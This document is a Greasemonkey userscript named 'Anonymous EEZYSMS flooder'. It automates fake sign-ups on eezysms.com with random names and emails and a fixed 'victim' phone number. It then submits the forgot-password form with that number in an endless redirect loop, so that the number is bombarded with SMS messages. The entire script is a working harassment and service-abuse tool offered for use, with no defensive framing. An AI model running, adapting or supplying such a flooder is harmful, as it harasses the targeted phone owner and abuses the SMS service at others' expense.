// ==UserScript==
// @name          Anonymous EEZYSMS flooder
// @namespace     AMARFF
// @include       http://*eezysms.com/*
// ==/UserScript==

var victim=15866463754;
if(document.location=="http://eezysms.com/veezy/index.php"||document.location=="http://www.eezysms.com/veezy/index.php")
{
document.getElementById('regusername').value='ads'+Math.floor(Math.random()*1456484);
document.getElementById('regName').value='asdfasd'+Math.floor(Math.random()*1456484);
document.getElementById('regemail').value='sdsa'+Math.floor(Math.random()*1456484)+'@gmail.com';
document.getElementById('regmobilenumber').value=15866463754;
document.getElementsByName("login")[1].click();void(0);
setTimeout("document.location='http://eezysms.com/veezy/index.php?action=forgotpassword'",1000)

}


if(document.location=="http://eezysms.com/veezy/index.php?action=forgotpassword"||document.location=="http://www.eezysms.com/veezy/index.php?action=forgotpassword")
{
document.getElementById('mobile').value=15866463754;
document.getElementsByName("login")[0].click();void(0);
}

if(document.location=="http://eezysms.com/veezy/index.php?action=forgotpasswordsendsms"||document.location=="http://www.eezysms.com/veezy/index.php?action=forgotpasswordsendsms")
document.location="http://eezysms.com/veezy/index.php?action=forgotpassword";